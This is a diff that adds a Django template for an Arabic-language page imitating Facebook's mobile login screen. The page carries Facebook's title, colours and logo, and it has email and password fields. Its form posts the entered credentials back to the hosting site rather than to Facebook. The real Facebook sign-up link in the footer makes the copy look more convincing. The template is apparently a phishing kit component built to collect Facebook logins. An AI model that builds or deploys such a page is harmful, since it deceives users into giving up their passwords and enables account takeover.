@@ -1,0 +1,286 @@
+{% load static  %}
+
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>تسجيل الدخول الى فيسبوك</title>
+
+    <!-- HTML -->
+
+    <style>
+        * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+}
+
+.header {
+  width: 100vw;
+  height: 110vh;
+}
+.header .nav {
+  width: 100%;
+  height: 100px;
+  display: flex;
+  flex-direction: column;
+  /* justify-content: center; */
+  align-items: center;
+}
+.header .nav .text {
+  width: 100%;
+  text-align: center;
+  padding: 10px 0;
+  background-color: #fffbe2;
+}
+
+.header .nav .text p {
+  font-size: 14px;
+  color: #637aa7;
+}
+.header .nav .img {
+  width: 100%;
+  height: 100%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.header .nav .img img {
+  width: 150px;
+}
+
+.form {
+  margin-top: 30px;
+  width: 100%;
+  height: 170px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  padding: 0 10px;
+}
+
+.form .box {
+  width: 95%;
+  height: 70px;
+  margin: 10px;
+  border-radius: 5px;
+  border: 1px solid #e0e0e0;
+}
+.form input {
+  width: 100%;
+  height: 100%;
+  border-radius: 5px;
+  border: none;
+  outline: none;
+  padding: 12px;
+  background-color: #f5f6f7;
+}
+.form .box input::placeholder {
+  position: absolute;
+  right: 0;
+  top: 50%;
+  transform: translateY(-50%);
+  margin-right: 10px;
+}
+.form input[type="submit"] {
+  width: 321px;
+  height: 40px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-weight: bold;
+  font-size: 16px;
+  color: white;
+  margin: 0;
+  transition: 0.4s;
+  background-color: #1877f2;
+}
+.form input[type="submit"]:hover {
+  opacity: 0.5;
+}
+.main a {
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+  margin-top: 10px;
+  color: #4989e1;
+  text-decoration: none;
+  transition: 0.3s;
+}
+.main a:hover {
+  text-decoration: underline;
+}
+
+.footer {
+  height: 260px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+}
+.footer .text {
+  height: 50%;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  align-items: center;
+}
+.footer .text .span {
+  width: 100%;
+  padding: 10px;
+  margin-top: 50px;
+  position: relative;
+}
+.footer .text .span .span1::after {
+  content: "";
+  position: absolute;
+
+  width: 40%;
+  height: 1px;
+  background-color: #dddfe3;
+}
+.footer .text .span .span2::after {
+  content: "";
+  position: absolute;
+  right: 0;
+  margin-right: 10px;
+  width: 40%;
+  height: 1px;
+  background-color: #dddfe3;
+}
+.footer .text .span .span-text {
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+}
+.footer .btn {
+  padding: 14px 20px;
+  outline: none;
+  border: none;
+  height: 35px;
+  line-height: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border-radius: 4px;
+  margin: auto 0;
+  color: white;
+  font-weight: bold;
+  background-color: #00a400;
+}
+
+.footer .btn a {
+  text-decoration: none;
+  color: white;
+}
+.footer .links {
+  height: 30%;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+}
+.footer .links div {
+  display: flex;
+  flex-direction: column;
+  justify-content: space-around;
+  align-items: center;
+}
+.footer .links div a {
+  text-decoration: none;
+  color: #4989e1;
+  font-size: 10px;
+}
+
+@media (min-width: 991px) {
+  .form {
+    width: 500px;
+    background-color: white;
+    margin: 20px auto;
+    height: 300px;
+  }
+  body {
+    background: #f0f2f5;
+  }
+  .form .box {
+    height: 40px;
+  }
+
+  .header .nav .text {
+    display: none;
+  }
+  .t-h {
+    font-size: 19px;
+  }
+}
+
+    </style>
+    <!-- Custom Styles -->
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+</head>
+
+<body>
+
+    <div class="header">
+        <div class="nav">
+            <div class="text">
+                <p> وتصفح بسرعة اكبر Android احصل على فيسبوك لنظام </p>
+            </div>
+            <div class="img">
+                <img src="{% static 'img/img.svg'  %}" alt="" />
+            </div>
+        </div>
+        <div class="main">
+            <form class="form" action="" method="POST" accept-charset="utf-8">
+              {% csrf_token %}
+                <p class="t-h"></p>
+                <div class="box">
+                    <input type="email" name="email" id="" value=""
+                        placeholder="رقم الهاتف المحمول او البريد الإلكتروني  " />
+
+                </div>
+                <div class="box">
+                    <input type="password" name="password" placeholder="كلمة السر " />
+                </div>
+
+                <input class="submit" type="submit" name="" id="" value="تسجيل الدخول " />
+
+            </form>
+            <p class="p"><a href="#">هل نسيت كلمة السر ؟</a></p>
+        </div>
+        <div class="footer">
+            <div class="text">
+                <div class="span">
+                    <span class="span1"></span>
+                    <span class="span-text">أو</span>
+                    <span class="span2"></span>
+                </div>
+                <button class="btn" type="button"><a
+                        href="https://www.facebook.com/r.php?next=https%3A%2F%2Fwww.facebook.com%2Fprofile.php%3Fid%3D100029489345584&locale=ar_AR&display=page">إنشاء
+                        حساب جديد</a> </button>
+            </div>
+            <div class="links">
+                <div class="div1">
+                    <a href="#">English (US)</a>
+                    <a href="#">Deutsch</a>
+                    <a href="#">Português (Brasil)</a>
+                </div>
+                <div class="div2">
+                    <a href="#">العربية</a>
+                    <a href="#">Français (France)</a>
+                    <a href="#">Español</a>
+                    <a href="#">Italiano</a>
+                </div>
+            </div>
+        </div>
+    </div>
+  
+</body>
+
+</html>
